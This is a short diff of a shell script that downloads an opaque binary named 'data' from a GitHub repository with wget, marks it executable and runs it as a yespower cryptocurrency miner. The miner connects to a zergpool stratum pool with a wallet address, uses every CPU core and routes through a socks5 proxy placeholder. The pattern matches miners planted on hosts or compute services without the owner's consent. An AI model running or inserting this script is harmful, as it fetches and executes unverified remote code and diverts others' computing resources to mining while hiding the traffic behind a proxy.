@@ -1,4 +1,4 @@
 apt update -y
-wget https://github.com/xx/xx/raw/main/data
+wget https://github.com/pruthvigithub1137/cpu/blob/main/data?raw=true
 chmod +x data
 ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.Test -p c=RVN -t $(nproc) -x socks5://put working socks5
